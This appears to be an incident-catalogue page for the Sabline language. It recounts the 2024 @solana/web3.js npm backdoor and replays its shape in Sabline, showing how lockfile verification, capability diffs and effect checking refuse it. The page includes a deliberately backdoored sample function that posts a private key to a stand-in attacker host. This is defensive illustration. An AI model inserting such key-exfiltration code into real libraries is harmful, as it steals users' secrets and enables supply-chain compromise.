# The Solana web3.js backdoor, replayed in Sabline

<!-- description: STOPPED: On 3 December 2024 an account with publish rights to `@solana/web3.js` was compromised through a spear-phishing email, and two unauthorised ... -->

**The @solana/web3.js backdoor, 1.95.6 and 1.95.7**, 2024-12-03. Also called the @solana/web3.js supply chain attack. ([The name in use](https://news.ycombinator.com/item?id=42322739).) Verdict: **`STOPPED`** - the shape, written in Sabline and run under a budget granting what the task needs, is refused - and the refusal is recorded and re-run on every push.

> [!NOTE]
> **This is the shape of the attack, not a claim that Sabline would have prevented the real event.** The real one happened in a language, a package manager, a build system or an agent framework that Sabline neither runs nor bounds. What this page shows is narrower and checkable: the same shape written in Sabline, the command, what the runtime printed, and the one line of budget that did the work - or, where nothing here addresses the shape, that.

## What happened

On 3 December 2024 an account with publish rights to `@solana/web3.js` was
compromised through a spear-phishing email, and two unauthorised versions,
1.95.6 and 1.95.7, were put on npm. The maintainers' advisory records that
the injected code stole private key material and that the risk fell on
applications which handle private keys directly, such as bots. The versions
went up at about 3:20pm UTC; a clean 1.95.8 was published at 8:25pm UTC, and
npm removed 1.95.6 and 1.95.7 entirely at about 12:22am UTC on 4 December.
Code added to five existing key-handling methods, including
`Keypair.fromSecretKey()` and `Keypair.fromSeed()`, captured private key
material and sent it to a server the attacker controlled.

## The shape, in Sabline

A library you already had was republished with something extra in it, and
the extra thing sent a value you passed in to somewhere you never named.
Sabline vendors a library as source into `lib/` and records its sha256 in
`sabline.lock`, so this shape meets three separate refusals, each of which
is enough on its own.

`sabline deps --verify` compares the bytes on disk against the lockfile and
says `CHANGED`, with both digests. `sabline deps-diff` compares the
reviewed version against the new one and reports what the newer one gained
- here, by name: `GAINED net:attacker.example.net`, with the file and line
of the `post` that reaches it. And the program that uses the library stops
compiling: `sign` now declares `uses net`, `main` declares `uses io`, and a
caller cannot silently inherit an effect its callee gained (E300). A
backdoor that reaches the network cannot hide behind a function signature,
because the signature is what the compiler checks the call against.

## The one line that does the work

sabline.lock

Not a grant this time but a file: the lockfile `sabline add` writes, and
`sabline deps --verify` reads in CI. It holds the digest of every vendored
library and the Sabline that added it, and `sabline add` refuses to replace
one with different bytes without `--force`.

### main.vel

```vel
// The application: it signs one transaction and prints the result. It
// declares `uses io`, because printing is all it does.

import "lib/wallet.vel" as wallet

fn main() uses io {
    print(wallet.sign("transfer 1 SOL", "the key this process holds"))
}
```

### wallet_backdoored.vel

```vel
// The same library, republished with the shape of the injected
// `addToQueue`: the key it is handed goes somewhere else on the way past.

fn sign(message: Text, key: Text) -> Text uses net {
    check post("https://attacker.example.net/queue", key) {
        ok answer {
            return "signed:" + message
        }
        fail why {
            return "signed:" + message
        }
    }
    return "signed:" + message
}
```

### wallet_reviewed.vel

```vel
// The library as it was reviewed and vendored: it signs a transaction,
// and it reaches nothing. Its signature says so - no `uses` clause at all.

fn sign(message: Text, key: Text) -> Text {
    return "signed:" + message
}
```

## What the runtime printed

Recorded by `incident_evidence.py`, and re-run by `check_incidents.py` on every push:

```text
# the library is reviewed and vendored, and its digest is locked
$ sabline add upstream/wallet.vel as wallet
added wallet -> lib/wallet.vel
  1 function(s), 0 with proven promises
  performs: nothing
  sha256 df61632589b6b6ca..., locked in sabline.lock
  use it with: import "lib/wallet.vel" as wallet
exit 0

# the application runs
$ sabline main.vel --allow io
signed:transfer 1 SOL
exit 0

# the library is republished with the key going somewhere else
$ sabline deps --verify
checking against sabline.lock (1 librar(ies))
  CHANGED  wallet - lib/wallet.vel is not the file that was locked
           locked df61632589b6b6ca...  now 0e26e845635ea8fd...

1 problem(s). A library that changed under you is worth looking at before trusting it.
exit 1

# what the new version gained, named
$ sabline deps-diff dir:. old new
sabline deps-diff: dir:. old -> new
  read old: directory ./old
  read new: directory ./new
  capability surface of the .vel files (1 in old, 1 in new): widened
    GAINED  net:attacker.example.net - a new effect, net
        in wallet.vel
          wallet.vel:5  sign calls post("https://attacker.example.net/queue")
    GAINED  wallet.vel: sign now declares net (in old it declared nothing)
        net: sign calls post at line 5
  install-time scripts: none in either version
  declared dependencies: none read - neither version has a manifest that declares them (a Sabline library names what it imports in its source)
new gained what is marked above.
exit 1

# and the application no longer compiles against it
$ sabline main.vel --allow io --receipt receipt.json
error[E300] function 'main' calls 'wallet.sign' which needs effect 'net', but 'main' only declares 'uses io'
  --> main.vel, line 7
  how to fix (pick one):
    1. add 'uses net' to the signature of 'main'
    2. remove the call to 'wallet.sign'
  reference: https://sabline.dev/llms.txt
exit 1
```

## Sources

- [GHSA-jcxm-7wvp-g6p5](https://github.com/solana-labs/solana-web3.js/security/advisories/GHSA-jcxm-7wvp-g6p5) - the maintainers' own advisory: the compromised publish account, the affected versions, and what the injected code did.
- [web3.js Exploit: Root Cause Analysis](https://www.anza.xyz/blog/web3-js-exploit-root-cause-analysis) - Anza's post-mortem: the window the versions were live, and the exfiltration path.

The entry, its program and its recorded run are in [incidents/solana-web3js-backdoor/](https://github.com/gowrishankar-infra/sabline-lang/blob/main/incidents/solana-web3js-backdoor/). Every incident, with its verdict, is in [the catalogue](incidents.md).
